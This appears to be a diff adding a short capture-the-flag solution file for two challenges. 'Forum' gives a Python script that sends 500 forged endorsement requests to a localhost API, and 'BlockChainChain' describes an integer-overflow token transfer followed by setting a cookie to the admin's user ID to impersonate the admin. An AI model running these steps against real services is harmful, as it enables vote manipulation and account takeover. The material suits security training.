@@ -1,0 +1,41 @@
+Forum:
+
+1) Create a user on the platform. 
+
+2) Get the userID of your user from the cookies or by capturing a request to the api.
+
+3) Make 500 requests to the /api/endorse endpoint with your userID and different endorserIDs:
+
+import requests
+
+# Configuration
+url = "http://localhost:3000/api/endorse"  # Change this
+userID = "user123"  # Your userID
+
+# Send 500 requests with different endorserIDs
+for i in range(1, 501):
+    endorserID = f"endorser{i}"
+
+    payload = {
+        "userID": userID,
+        "endorserID": endorserID
+    }
+
+    try:
+        response = requests.post(url, json=payload)
+        print(f"Request {i}: {response.json()}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request {i} failed: {e}")
+
+4) Access the hidden thread and get the flag
+
+
+BlockChainChain:
+
+1) Register a user via /register
+
+2) Transfer a very large amount of h4xcoin to the admin to overflow the amount transferred.
+
+3) Take the userID of the admin from the transaction and set your forum cookies to it.
+
+4) Get the flag.
